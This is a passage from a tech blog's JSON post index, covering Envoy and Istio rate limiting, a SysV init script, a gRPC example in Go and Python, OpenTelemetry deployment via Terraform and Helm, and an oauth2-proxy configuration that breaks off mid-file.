LOGICAL_DNS 59 # Comment out the following line to test on v6 networks 60 dns_lookup_family: V4_ONLY 61 load_assignment: 62 cluster_name: service_envoyproxy_io 63 endpoints: 64 - lb_endpoints: 65 - endpoint: 66 address: 67 socket_address: 68 address: www.envoyproxy.io 69 port_value: 443 70 transport_socket: 71 name: envoy.transport_sockets.tls 72 typed_config: 73 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext 74 sni: www.envoyproxy.io Envoy wasm plugin knowledge writing envoy wasm plugin famous httpbin program for request istio wasm extensions proxy wasm go sdk tetratelabs series how to write wasm in istio ","link":"https://blog.wisekee.com/post/envoyproxy-getting-started/","section":"post","tags":["envoy","service mesh","envoyproxy"],"title":"Envoyproxy getting started"},{"body":"There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.\nDataflow next gen data engineering tools A modular implementation of timely dataflow in Rust\nApache DataFusion SQL Query Engine\nApache Arrow is a multi-language toolbox for accelerated data interchange and in-memory processing\nDistributed stream processing engine in Rust\nhttps://github.com/volcano-sh/volcano(About A Cloud Native Batch System (Project under CNCF))\nhttps://github.com/apache/yunikorn-core( light-weight, universal resource scheduler for container orchestrator systems)\nhttps://github.com/apache/airflow/(A platform to programmatically author, schedule, and monitor workflows)\nhttps://github.com/sql-machine-learning/sqlflow(Brings SQL and AI together.)\nhttps://github.com/open-metadata/OpenMetadata(About Open Standard for Metadata. A Single place to Discover, Collaborate and Get your data right)\nhttps://github.com/data-observe/datav(Fully Customizable and programmable observability platform)\nhttps://github.com/awslabs/data-on-eks(DoEKS is a tool to build, deploy and scale Data Platforms on Amazon EKS)\n()\n()\n()\n()\n","link":"https://blog.wisekee.com/post/bigdata-open-source/","section":"post","tags":["open source","cncf","bigdata"],"title":"Awesome open resoure new generational data laek house tools and project"},{"body":"Use external rate limit service deployment the Envoyproxy ratelimit service to kubernetes deployment the redis to serve envoy proxy ratelimit use Envoyproxy ratelimit serivce in envoy filter chains through grpc service for every workloads create Envoyfilter rule Deployment the envoy ratelimit service the deployment.yaml to reference 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: envoy-ratelimt 5 namespace: istio-system 6 labels: 7 app: envoy-ratelimt 8spec: 9 replicas: 2 10 selector: 11 matchLabels: 12 app: envoy-ratelimt 13 template: 14 metadata: 15 creationTimestamp: null 16 labels: 17 app: envoy-ratelimt 18 spec: 19 volumes: 20 - name: config 21 configMap: 22 name: ratelimit-config 23 defaultMode: 420 24 optional: false 25 containers: 26 - name: ratelimit 27 image: \u0026gt;- 28 envoyproxy/ratelimit:9d8d70a8 29 command: 30 - /bin/ratelimit 31 env: 32 - name: REDIS_SOCKET_TYPE 33 value: tcp 34 - name: REDIS_URL 35 value: redis-master:6379 36 - name: RUNTIME_ROOT 37 value: /data 38 - name: RUNTIME_SUBDIRECTORY 39 value: ratelimit 40 - name: RUNTIME_IGNOREDOTFILES 41 value: \u0026#39;true\u0026#39; 42 - name: RUNTIME_WATCH_ROOT 43 value: \u0026#39;false\u0026#39; 44 - name: USE_STATSD 45 value: \u0026#39;false\u0026#39; 46 - name: LOG_LEVEL 47 value: info 48 resources: 49 limits: 50 cpu: 1024m 51 memory: 1Gi 52 requests: 53 cpu: 256m 54 memory: 256Mi 55 volumeMounts: 56 - name: config 57 mountPath: /data/ratelimit/config 58 mountPropagation: None 59 terminationMessagePath: /dev/termination-log 60 terminationMessagePolicy: File 61 imagePullPolicy: IfNotPresent 62 restartPolicy: Always 63 strategy: 64 type: RollingUpdate 65 rollingUpdate: 66 maxUnavailable: 25% 67 maxSurge: 25% 68 revisionHistoryLimit: 10 69 progressDeadlineSeconds: 600 the ratelimit-config configmap 1apiVersion: v1 2kind: ConfigMap 3metadata: 4 name: ratelimit-config 5 namespace: istio-system 6data: 7 config.yaml: | 8 domain: envoy-ratelimit 9 descriptors: 10 - key: FIFTY_REQ_PER_MINUTE 11 rate_limit: 12 unit: minute 13 requests_per_unit: 50 14 - key: FIVE_REQ_PER_SECOND 15 rate_limit: 16 unit: second 17 requests_per_unit: 5 18 - key: TEN_REQ_PER_SECOND 19 rate_limit: 20 requests_per_unit: 10 21 unit: second 22 - key: TEN_REQ_PER_MINUTE 23 value: \u0026#34;x-minute-10\u0026#34; 24 rate_limit: 25 requests_per_unit: 10 26 unit: minute 27 - key: TWENTY_REQ_PER_SECOND_BASE_PATH 28 rate_limit: 29 requests_per_unit: 20 30 unit: second 31 value: \u0026#34;/api/version\u0026#34; 32 - key: THREE_REQ_PER_SECOND_HEADER_MATCH 33 value: \u0026#34;get\u0026#34; 34 descriptors: 35 - key: \u0026#34;HEADER_RANGE\u0026#34; 36 value: \u0026#34;x-second-3\u0026#34; 37 rate_limit: 38 requests_per_unit: 3 39 unit: second create the ratelimit-svc service 1apiVersion: v1 2kind: Service 3metadata: 4 name: ratelimit-svc 5 namespace: istio-system 6status: 7 loadBalancer: {} 8spec: 9 ports: 10 - name: grpc 11 protocol: TCP 12 port: 8081 13 targetPort: 8081 14 - name: http 15 protocol: TCP 16 port: 8080 17 targetPort: 8080 18 selector: 19 app: envoy-ratelimt 20 type: ClusterIP 21 sessionAffinity: None 22 ipFamilies: 23 - IPv4 24 ipFamilyPolicy: SingleStack 25 internalTrafficPolicy: Cluster Use the ratelimit service for particular workload 1apiVersion: networking.istio.io/v1alpha3 2kind: EnvoyFilter 3metadata: 4 labels: 5 app: demo-api-ratelimit 6 name: demo-api-ratelimit-envoyfilter 7 namespace: default 8spec: 9 workloadSelector: 10 labels: 11 app: demo-api 12 configPatches: 13 - applyTo: HTTP_FILTER 14 match: 15 context: SIDECAR_INBOUND 16 listener: 17 filterChain: 18 filter: 19 name: envoy.filters.network.http_connection_manager 20 subFilter: 21 name: envoy.filters.http.router 22 patch: 23 operation: INSERT_BEFORE 24 value: 25 name: envoy.filters.http.ratelimit 26 typed_config: 27 \u0026#34;@type\u0026#34;: \u0026#34;type.googleapis.com/envoy.extensions.filters.http.ratelimit.v3.RateLimit\u0026#34; 28 domain: hpa-ratelimit # must match domain in ratelimit ConfigMap 29 failure_mode_deny: false # run plugin in fail-open mode, no limiting happens if ratelimit is unavailable 30 enable_x_ratelimit_headers: DRAFT_VERSION_03 31 disable_x_envoy_ratelimited_header: true 32 rate_limit_service: 33 grpc_service: 34 envoy_grpc: 35 cluster_name: rate_limit_service 36 timeout: 10s 37 transport_api_version: V3 38 39 - applyTo: CLUSTER 40 match: 41 cluster: 42 # this should be the ratelimit kubernetes service FQDN 43 service: ratelimit-svc.istio-system.svc.cluster.local 44 patch: 45 # add a new cluster for rate limit service 46 operation: ADD 47 value: 48 connect_timeout: 10s 49 load_assignment: 50 cluster_name: rate_limit_service 51 endpoints: 52 - lb_endpoints: 53 - endpoint: 54 address: 55 socket_address: 56 address: ratelimit-svc.istio-system.svc.cluster.local 57 port_value: 8081 58 http2_protocol_options: {} 59 lb_policy: ROUND_ROBIN 60 name: rate_limit_service 61 type: STRICT_DNS 62 63# the match rule reference: https://www.envoyproxy.io/docs/envoy/latest/api-v3/config/route/v3/route_components.proto#envoy-v3-api-msg-config-route-v3-headermatcher 64 - applyTo: VIRTUAL_HOST 65 match: 66 context: SIDECAR_INBOUND 67 # routeConfiguration: 68 # # portNumber: 80 69 # vhost: 70 # name: inbound|http|80 # port must be a port your Service is listening on 71 routeConfiguration: 72 vhost: 73 name: \u0026#34;inbound|http|80\u0026#34; 74 route: 75 action: ANY 76 patch: 77 operation: MERGE 78 value: 79 rate_limits: 80 - actions: 81 - header_value_match: 82 descriptor_key: \u0026#34;TWENTY_REQ_PER_SECOND_BASE_PATH\u0026#34; 83 descriptor_value: \u0026#34;/api/version\u0026#34; 84 headers: 85 - name: :path 86 prefix_match: /api/version 87 - actions: 88 - request_headers: 89 header_name: \u0026#34;:path\u0026#34; 90 descriptor_key: \u0026#34;FIVE_REQ_PER_SECOND\u0026#34; 91 - actions: 92 - header_value_match: 93 descriptor_key: \u0026#34;TEN_REQ_PER_MINUTE\u0026#34; 94 descriptor_value: \u0026#34;x-minute-10\u0026#34; 95 headers: 96 - name: :method 97 prefix_match: GET 98 - name: x-minute-10 99 range_match: 100 start: 100 101 end: 200 Now use the local ratelimit is better use istio CR to define the envoy proxy filter\n1# local rate limit reference to: https://www.envoyproxy.io/docs/envoy/latest/configuration/http/http_filters/local_rate_limit_filter 2# configuration reference: https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/http/local_ratelimit/v3/local_rate_limit.proto#envoy-v3-api-msg-extensions-filters-http-local-ratelimit-v3-localratelimit 3apiVersion: networking.istio.io/v1alpha3 4kind: EnvoyFilter 5metadata: 6 name: demo-api-localratelimit-envoyfilter 7 namespace: default 8spec: 9 workloadSelector: 10 labels: 11 app: demo-api-df79124 12 configPatches: 13 - applyTo: HTTP_FILTER 14 match: 15 context: SIDECAR_INBOUND 16 listener: 17 filterChain: 18 filter: 19 name: \u0026#34;envoy.filters.network.http_connection_manager\u0026#34; 20 patch: 21 operation: INSERT_BEFORE 22 value: 23 name: envoy.filters.http.local_ratelimit 24 typed_config: 25 \u0026#34;@type\u0026#34;: type.googleapis.com/udpa.type.v1.TypedStruct 26 type_url: type.googleapis.com/envoy.extensions.filters.http.local_ratelimit.v3.LocalRateLimit 27 value: 28 stat_prefix: demo-api 29 enable_x_ratelimit_headers: DRAFT_VERSION_03 30 31 - applyTo: HTTP_ROUTE 32 match: 33 context: SIDECAR_INBOUND 34 routeConfiguration: 35 vhost: 36 name: \u0026#34;inbound|http|80\u0026#34; 37 route: 38 action: ANY 39 patch: 40 operation: MERGE 41 value: 42 route: 43 rate_limits: 44 # The actions reference: https://www.envoyproxy.io/docs/envoy/latest/api-v3/config/route/v3/route_components.proto#envoy-v3-api-msg-config-route-v3-ratelimit 45 - actions: 46 - header_value_match: 47 descriptor_key: \u0026#34;TEN_REQ_PER_MINUTE\u0026#34; 48 descriptor_value: \u0026#34;x-minute-10\u0026#34; 49 headers: 50 - name: :method 51 prefix_match: GET 52 - name: x-minute-10 53 range_match: 54 start: 100 55 end: 200 56 - actions: 57 - query_parameter_value_match: 58 descriptor_key: \u0026#34;ONE_REQ_PER_SECOND\u0026#34; 59 descriptor_value: \u0026#34;OnePerSec\u0026#34; 60 query_parameters: 61 - name: is_office 62 present_match: true 63 64 - actions: 65 - request_headers: 66 header_name: \u0026#34;:path\u0026#34; 67 descriptor_key: \u0026#34;TEN_REQ_PER_SECOND\u0026#34; 68 69 70 typed_per_filter_config: 71 envoy.filters.http.local_ratelimit: 72 \u0026#34;@type\u0026#34;: type.googleapis.com/udpa.type.v1.TypedStruct 73 type_url: type.googleapis.com/envoy.extensions.filters.http.local_ratelimit.v3.LocalRateLimit 74 value: 75 stat_prefix: demo-api 76 enable_x_ratelimit_headers: DRAFT_VERSION_03 77 descriptors: 78 - entries: 79 - key: TEN_REQ_PER_SECOND 80 value: \u0026#34;/api/v2\u0026#34; 81 token_bucket: 82 max_tokens: 500 83 tokens_per_fill: 500 84 fill_interval: 60s 85 - entries: 86 - key: ONE_REQ_PER_SECOND 87 value: \u0026#34;OnePerSec\u0026#34; 88 token_bucket: 89 max_tokens: 60 90 tokens_per_fill: 60 91 fill_interval: 60s 92 - entries: 93 - key: TEN_REQ_PER_MINUTE 94 value: \u0026#34;x-minute-10\u0026#34; 95 token_bucket: 96 max_tokens: 10 97 tokens_per_fill: 10 98 fill_interval: 60s 99 filter_enabled: 100 runtime_key: local_rate_limit_enabled 101 default_value: 102 numerator: 100 103 denominator: HUNDRED 104 filter_enforced: 105 runtime_key: local_rate_limit_enforced 106 default_value: 107 numerator: 100 108 denominator: HUNDRED 109 token_bucket: 110 max_tokens: 1000 111 tokens_per_fill: 1000 112 fill_interval: 60s Enable the statistics for rate limit of pod template 1template: 2 metadata: 3 annotations: 4 proxy.istio.io/config: |- 5 proxyStatsMatcher: 6 inclusionRegexps: 7 - \u0026#34;.*http_local_rate_limit.*\u0026#34; ","link":"https://blog.wisekee.com/post/envoy-ratelimit/","section":"post","tags":["ratelimit","service mesh","envoyproxy"],"title":""},{"body":"","link":"https://blog.wisekee.com/tags/ratelimit/","section":"tags","tags":null,"title":"ratelimit"},{"body":"","link":"https://blog.wisekee.com/tags/init.d/","section":"tags","tags":null,"title":"init.d"},{"body":"","link":"https://blog.wisekee.com/tags/systemv/","section":"tags","tags":null,"title":"systemv"},{"body":"","link":"https://blog.wisekee.com/tags/update-rc/","section":"tags","tags":null,"title":"update-rc"},{"body":"Init scripts are typically stored in the /etc/init.d/ directory and are started using the init process, which is the first process started by the Linux kernel.\nWrite the init script with systemv style cat /etc/init.d/demo-service\n1#!/usr/bin/env bash 2 3### BEGIN INIT INFO 4# Provides: restore-iptables 5# Required-Start: 6# Required-Stop: 7# Default-Start: 2 3 4 5 8# Default-Stop: 0 1 6 9# Short-Description: load iptables rule when reboot 10# Description: Automation restore the iptables rule from file, when system is reboot. 11### END INIT INFO 12 13iptables-restore \u0026lt; /root/iptables.txt To enable and install the systemv bootstrap script 1# install the service 2update-rc.d demo-service defaults 3# enable a service 4update-rc.d demo-service enable 5# disalbe the service 6update-rc.d demo-service disable 7# forcibly remove the service 8update-rc.d -f demo-service remove 9# Also use systemctl 10systemctl status load-iptables Reference how to add systemd service ","link":"https://blog.wisekee.com/post/update-rc.d-systemv/","section":"post","tags":["update-rc","init.d","systemv"],"title":"use systemv manager the auto boot script and servcie"},{"body":"","link":"https://blog.wisekee.com/tags/grpc/","section":"tags","tags":null,"title":"Grpc"},{"body":"Create the structure 1mkdir myapp 2cd myapp \u0026amp;\u0026amp; go mod init myapp 3go mod tidy The steps Create the proto file descript the message 1syntax = \u0026#34;proto3\u0026#34;; 2package proto; 3 4option go_package = \u0026#34;./proto\u0026#34;; 5 6//A sample service which contains all our rpc. 7service MyService{ 8 //The definition of rpc. 9 rpc MyFunc(Request) returns (StringMessage) {} 10} 11 12//Empty Request. 13message Request { 14} 15 16//The message to Return when rpc is invoked. 17message StringMessage { 18 string reply = 1; 19} Compile the proto file use protoc --go_out=. --go_opt=paths=source_relative --go-grpc_out=. hello-world.proto Move the pb file to proto folder mv hello-world.pb.go ./proto/ Finally folder structure 1├── go.mod 2├── go.sum 3├── hello-world.proto 4├── main.go 5└── proto 6 ├── hello-world.pb.go 7 └── hello-world_grpc.pb.go The main.go code 1package main 2 3import ( 4 \u0026#34;context\u0026#34; 5 \u0026#34;fmt\u0026#34; 6 \u0026#34;net\u0026#34; 7 8 pb \u0026#34;myapp/proto\u0026#34; 9 10 \u0026#34;google.golang.org/grpc\u0026#34; 11) 12 13type server struct { 14 pb.UnimplementedMyServiceServer 15} 16 17func (s *server) MyFunc(ctx context.Context, input *pb.Request) (*pb.StringMessage, error) { 18 fmt.Print(\u0026#34;Inside The actual caller rpc FUnction\u0026#34;) 19 return \u0026amp;pb.StringMessage{Reply: \u0026#34;Hey There\u0026#34;}, nil 20} 21 22func main() { 23 plistener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:2408\u0026#34;) 24 if err != nil { 25 panic(\u0026#34;Failed to bind to port\u0026#34;) 26 } 27 28 //Creating a New gRPC server 29 gServ := grpc.NewServer() 30 //Binding the stub function with the func we created 31 pb.RegisterMyServiceServer(gServ, \u0026amp;server{}) 32 fmt.Print(\u0026#34;gRPC server starting at port 2408\u0026#34;) 33 if err := gServ.Serve(plistener); err != nil { 34 panic(\u0026#34;Unable to start gRPC server\u0026#34;) 35 } 36} To testing the grpc server go run main.go To build the server binary go build -o gRPC-server main.go Run the server ./gRPC-server To create python client invoker the grpc server endpoint Create the virtual environment python3 -m venv ~/.venv/global Active the environment source ~/.venv/global/bin/activate Install the gRPC tools pip install grpcio-tools Generate the client python code python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. hello-world.proto Create client.py 1import grpc 2import os 3import hello_world_pb2_grpc 4import hello_world_pb2 5import time 6 7def invoke(): 8 server_addr = os.getenv(\u0026#34;SERVER_URL\u0026#34;) 9 channel = grpc.insecure_channel(server_addr) 10 stub = hello_world_pb2_grpc.MyServiceStub(channel) 11 while True: 12 response = stub.MyFunc(hello_world_pb2.Request()) 13 print(response) 14 time.sleep(5) 15 16invoke() Run the client endpoint to testingSERVER_URL=127.0.0.1:2408 python3 ./client.py How to invoke the GRPC service grpcbin-example-go gRPC sample application gRPC quickstart ","link":"https://blog.wisekee.com/post/grpc-getting-started/","section":"post","tags":["Go","Grpc","kubernetes"],"title":"Grpc example and getting started"},{"body":"","link":"https://blog.wisekee.com/tags/kubernetes/","section":"tags","tags":null,"title":"kubernetes"},{"body":"Usually for serivce better performance. we can use GRPC and multiple instance deployment for app, then the GRPC load balancing is challenges\nCreate Grpc headless service for Grpc app when multiple instance is enable for GRPC service in order to load balacing the GRPC service, needs create headless service let client load balancing\n1apiVersion: v1 2kind: Service 3metadata: 4 name: grpc-demo-headless 5 namespace: apps 6spec: 7 ports: 8 - name: tcp-30555 9 protocol: TCP 10 port: 30555 11 targetPort: 30555 12 selector: 13 app: grpc-demo-app 14 clusterIP: None 15 type: ClusterIP Use Envoy proxy the headless service implementation load balancing deploy the envoy proxy 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: envoy-proxy-grpc-demo 5 namespace: apps 6 labels: 7 app: envoy-proxy-grpc-demo 8spec: 9 replicas: 1 10 selector: 11 matchLabels: 12 app: envoy-proxy-grpc-demo 13 template: 14 metadata: 15 labels: 16 app: envoy-proxy-grpc-demo 17 sidecar.istio.io/inject: \u0026#34;false\u0026#34; 18 spec: 19 volumes: 20 - name: envoy-config 21 configMap: 22 name: envoy-proxy-grpc-demo 23 containers: 24 - name: envoy-proxy-grpc-demo 25 image: envoyproxy/envoy:v1.26-latest 26 command: [\u0026#34;envoy\u0026#34;, \u0026#34;--config-path\u0026#34;, \u0026#34;/etc/envoy/envoy.yaml\u0026#34;] 27 volumeMounts: 28 - name: envoy-config 29 mountPath: /etc/envoy 30 ports: 31 - containerPort: 30555 then create the Envoy configmap to proxy to app headless use Envoy builtin load balancing function 1apiVersion: v1 2kind: ConfigMap 3metadata: 4 name: envoy-proxy-grpc-demo 5data: 6 \u0026#34;envoy.yaml\u0026#34;: | 7 admin: 8 address: 9 socket_address: 10 protocol: TCP 11 address: 0.0.0.0 12 port_value: 9901 13 static_resources: 14 listeners: 15 - name: listener_0 16 address: 17 socket_address: 18 protocol: TCP 19 address: 0.0.0.0 20 port_value: 30555 21 filter_chains: 22 - filters: 23 - name: envoy.filters.network.http_connection_manager 24 typed_config: 25 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager 26 codec_type: AUTO 27 add_user_agent: true 28 access_log: 29 - name: envoy.access_loggers.stdout 30 typed_config: 31 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.access_loggers.stream.v3.StdoutAccessLog 32 stat_prefix: egress_http 33 common_http_protocol_options: 34 idle_timeout: 0.840s 35 use_remote_address: true 36 route_config: 37 name: local_route 38 virtual_hosts: 39 - name: backend 40 domains: 41 - \u0026#34;*\u0026#34; 42 routes: 43 - match: 44 prefix: \u0026#34;/\u0026#34; 45 route: 46 cluster: grpc-demo-headless 47 http_filters: 48 - name: envoy.filters.http.grpc_web 49 typed_config: 50 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.grpc_web.v3.GrpcWeb 51 - name: envoy.filters.http.cors 52 typed_config: 53 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.cors.v3.Cors 54 - name: envoy.filters.http.grpc_http1_bridge 55 typed_config: 56 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.grpc_http1_bridge.v3.Config 57 - name: envoy.filters.http.router 58 typed_config: 59 \u0026#34;@type\u0026#34;: type.googleapis.com/envoy.extensions.filters.http.router.v3.Router 60 61 clusters: 62 - name: grpc-demo-headless 63 type: STRICT_DNS 64 lb_policy: LEAST_REQUEST 65 connect_timeout: 30s 66 dns_lookup_family: V4_ONLY 67 http2_protocol_options: {} 68 load_assignment: 69 cluster_name: grpc-demo-headless 70 endpoints: 71 - lb_endpoints: 72 - endpoint: 73 address: 74 socket_address: 75 address: grpc-demo-headless 76 port_value: 30555 Lastly create the Envoy proxy service to Envoy proxy pod 1apiVersion: v1 2kind: Service 3metadata: 4 name: envoy-proxy-grpc-demo 5 namespace: apps 6spec: 7 selector: 8 app: envoy-proxy-grpc-demo 9 ports: 10 - protocol: TCP 11 port: 30555 12 targetPort: 30555 13 type: ClusterIP Create local proxy to envoy service in localhost 1kubectl port-forward svc/envoy-proxy-grpc-demo -n apps 60400:30555 Debug in local 1# install grpcurl in local 2go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest 3# list service through proto file 4grpcurl -plaintext -proto example.proto localhost:60400 list 5# list method of services 6grpcurl -plaintext -proto example.proto localhost:60400 list com.ServiceExample 7# invoke the grpc method 8grpcurl -d \u0026#39;{\u0026#34;field1\u0026#34;: \u0026#34;value1\u0026#34;, \u0026#34;field2\u0026#34;: \u0026#34;value2\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;}\u0026#39; -plaintext -proto example.proto localhost:60400 com.ServiceExample.Get Awesome the grpc tools and contents awesome-grpc ","link":"https://blog.wisekee.com/post/grpc-awesome/","section":"post","tags":["Go","Grpc","kubernetes"],"title":"How to call to kubernets grpc services in local"},{"body":"","link":"https://blog.wisekee.com/tags/authortication/","section":"tags","tags":null,"title":"Authortication"},{"body":"","link":"https://blog.wisekee.com/tags/cloud-native/","section":"tags","tags":null,"title":"Cloud Native"},{"body":"Use Helm+Terraform to installing and initialization the OpenTelmetry and Enable auto instrumentation the workloads\nDowload the OpenTelmetry Operator Helm package to local 1# add OpenTelemetry chat repo 2helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts 3# pull the chat package 4helm pull open-telemetry/opentelemetry-operator 5# https://github.com/open-telemetry/opentelemetry-demo 6# Or download the opentelmetry-demo chat 7helm pull open-telemetry/opentelemetry-demo 8tar -xzvf opentelemetry-operator-0.24.1.tgz 9tar -xzvf opentelemetry-demo-0.19.1.tgz Create OpenTelmetry resources in Terraform code The namesapce resource named to opentelemetry 1resource \u0026#34;kubernetes_namespace\u0026#34; \u0026#34;opentelemetry\u0026#34; { 2 metadata { 3 annotations = { 4 name = \u0026#34;opentelemetry\u0026#34; 5 } 6 labels = { 7 \u0026#34;kubesphere.io/namespace\u0026#34; = \u0026#34;opentelemetry\u0026#34; 8 } 9 name = \u0026#34;opentelemetry\u0026#34; 10 } 11} Create opreator resource 1resource \u0026#34;helm_release\u0026#34; \u0026#34;opentelemetry_operator\u0026#34; { 2 name = \u0026#34;opentelemetry-operator\u0026#34; 3 chart = \u0026#34;./charts/opentelemetry-operator\u0026#34; 4 namespace = kubernetes_namespace.opentelemetry.metadata.0.name 5 6 values = [ 7 \u0026lt;\u0026lt;-EOF 8 manager: 9 image: 10 repository: myregister.com/opentelemetry/operator 11 tag: v0.70.0 12 collectorImage: 13 repository: myregister.com/opentelemetry/collector-contrib 14 tag: 0.72.0 15 autoInstrumentationImage: 16 java: 17 repository: \u0026#34;myregister.com/otlp/javaagent\u0026#34; 18 tag: \u0026#34;v1.0-23.0\u0026#34; 19 nodejs: 20 repository: \u0026#34;myregister.com/otlp/nodejs\u0026#34; 21 tag: \u0026#34;v1.0-16\u0026#34; 22 python: 23 repository: \u0026#34;myregister.com/otlp/python\u0026#34; 24 tag: \u0026#34;v1.0\u0026#34; 25 dotnet: 26 repository: \u0026#34;myregister.com/otlp/dotnet\u0026#34; 27 tag: \u0026#34;v1.0-6.0\u0026#34; 28 kubeRBACProxy: 29 image: 30 repository: myregister.com/kubebuilder/kube-rbac-proxy 31 tag: v0.13.0 32 33 34 EOF 35 ] 36} Create instrumetation custom resource 1resource \u0026#34;helm_release\u0026#34; \u0026#34;opentelemetry_instrumentation\u0026#34; { 2 name = \u0026#34;opentelemetry-instrumentation\u0026#34; 3 chart = \u0026#34;./charts/raw\u0026#34; 4 namespace = \u0026#34;workloads-apps\u0026#34; 5 values = [ 6 \u0026lt;\u0026lt;-EOF 7 nameOverride: opentelemetry-instrumentation 8 resources: 9 - apiVersion: opentelemetry.io/v1alpha1 10 kind: Instrumentation 11 metadata: 12 name: opentelemetry-instrumentation 13 spec: 14 exporter: 15 endpoint: http://signoz-otel-collector.signoz:4317 16 propagators: 17 - tracecontext 18 - baggage 19 - b3 20 sampler: 21 type: parentbased_traceidratio 22 argument: \u0026#34;0.25\u0026#34; 23 nodejs: 24 env: 25 - name: OTEL_EXPORTER_OTLP_ENDPOINT 26 value: http://signoz-otel-collector.signoz:4317 27 dotnet: 28 env: 29 - name: OTEL_EXPORTER_OTLP_ENDPOINT 30 value: http://signoz-otel-collector.signoz:4318 31 java: 32 env: 33 - name: OTEL_EXPORTER_OTLP_ENDPOINT 34 value: http://signoz-otel-collector.signoz:4317 35 python: 36 env: 37 # Required if endpoint is set to 4317. 38 # Python autoinstrumentation uses http/proto by default 39 # so data must be sent to 4318 instead of 4137. 40 - name: OTEL_EXPORTER_OTLP_ENDPOINT 41 value: http://signoz-otel-collector.signoz:4318 42 EOF 43 ] 44} Enable the pod to instrumetation the app add annotations to deployment spec template sections\n1# for java 2spec: 3 replicas: 1 4 selector: 5 matchLabels: 6 app: opentelemetry-demo-for-java 7 template: 8 metadata: 9 annotations: 10 instrumentation.opentelemetry.io/inject-java: \u0026#39;true\u0026#39; 11# for dotnet use following annotation 12annotations: 13 instrumentation.opentelemetry.io/container-names: dotnet-for-instrumentation 14 instrumentation.opentelemetry.io/inject-dotnet: \u0026#39;true\u0026#39; Also use open source Signoz as Telemetry backend and frontend tools 1# add signoz helm chat repo 2helm repo add signoz https://charts.signoz.io 3tar -xzvf signoz-0.11.3.tgz ","link":"https://blog.wisekee.com/post/up_and_running_opentelmetry/","section":"post","tags":["OpenTelemetry","Metrics","Cloud Native"],"title":"Launch OpenTelemetry in eks and collect the metric, trace, logs"},{"body":"","link":"https://blog.wisekee.com/tags/metrics/","section":"tags","tags":null,"title":"Metrics"},{"body":"","link":"https://blog.wisekee.com/tags/oidc/","section":"tags","tags":null,"title":"OIDC"},{"body":"","link":"https://blog.wisekee.com/tags/opentelemetry/","section":"tags","tags":null,"title":"OpenTelemetry"},{"body":"To protect the some internal web resources we can use Oauth2 proxy to integration many identity tools for example: gitlab, github, Open ID, OpenLDAP and so on\nGet the Oauth2-proxy helm chat package 1# add the oauth2-pxory helm repo url 2helm repo add oauth2-proxy https://oauth2-proxy.github.io/manifests 3# decompression the tar package 4tar -xzvf oauth2-proxy-6.10.1.tgz 5# move to chats sub directory 6mv oauth2-proxy /terraform/iac/charts The oauth2-proxy config 1resource \u0026#34;helm_release\u0026#34; \u0026#34;oauth2-proxy\u0026#34; { 2 name = \u0026#34;oauth2-proxy\u0026#34; 3 chart = \u0026#34;./charts/oauth2-proxy\u0026#34; 4 namespace = \u0026#34;default\u0026#34; 5 6 values = [ 7 \u0026lt;\u0026lt;-EOF 8 config: 9 existingSecret: \u0026#34;oauth2-proxy\u0026#34; 10 cookieName: \u0026#34;oauth2\u0026#34; 11 configFile: |- 12 provider=\u0026#34;oidc\u0026#34; 13 email_domains=[\u0026#34;*\u0026#34;] 14 redirect_url=\u0026#34;https://oauth2.test.com/oauth2/callback\u0026#34; 15 oidc_issuer_url=\u0026#34;https://dex-oidc.test.com\u0026#34; 16 upstreams=[\u0026#34;http://myui:2802/\u0026#34;, \u0026#34;http://test2.other:3000/demo/\u0026#34;] 17 insecure_oidc_allow_unverified_email=\u0026#34;true\u0026#34; 18 pass_authorization_header=\u0026#34;true\u0026#34; 19 pass_access_token=\u0026#34;true\u0026#34; 20 pass_basic_auth=\u0026#34;true\u0026#34; 21 set_authorization_header=\u0026#34;true\u0026#34; 22 custom_sign_in_logo = \u0026#34;https://img.test.com/test.png\u0026#34; 23 provider_display_name = \u0026#34;GitLab login\u0026#34; 24 banner=\u0026#34;GitLab\u0026#34; 25 skip_auth_regex=[\u0026#34;\\\\.css$\u0026#34;, \u0026#34;\\\\.js$\u0026#34;, \u0026#34;\\\\.woff2$\u0026#34;, \u0026#34;\\\\.svg$\u0026#34;, \u0026#34;\\\\.png$\u0026#34;, \u0026#34;\\\\.ico$\u0026#34;, \u0026#34;\\\\.json\u0026#34;] 26 image: 27 repository: \u0026#34;myregistory.com/oauth2-proxy/oauth2-proxy\u0026#34; 28 tag: \u0026#34;v7.4.0\u0026#34; 29 serviceAccount: 30 enabled: false 31 ingress: 32 enabled: true 33 path: / 34 annotations: 35 kubernetes.io/ingress.class: nginx 36 hosts: 37 - oauth2-login.test.com 38 EOF 39 ] 40} Oauth2-proxy provide the access apis {HostUrl}/oauth2/userinfo {HostUrl}/oauth2/sign_in {HostUrl}/oauth2/sign_out Oauth2 proxy values template 1config: 2 cookieSecret: \u0026#34;XXXXXXXXXXXXXXXX\u0026#34; # https://oauth2-proxy.github.io/oauth2-proxy/docs/configuration/overview/#generating-a-cookie-secret 3 # cookieName: \u0026#34;_oauth2_proxy\u0026#34; # Name of the cookie that oauth2-proxy creates, if not set defaults to \u0026#34;_oauth2_proxy\u0026#34; 4 configFile: |- 5 email_domains = [ \u0026#34;*\u0026#34; ] # Restrict to these E-Mail Domains, a wildcard \u0026#34;*\u0026#34; allows any email 6alphaConfig: 7 enabled: true 8 providers: 9 - clientID: # IdP Client ID 10 clientSecret: # IdP Client Secret 11 id: oidc-istio 12 provider: oidc # We use the generic \u0026#39;oidc\u0026#39; provider 13 loginURL: 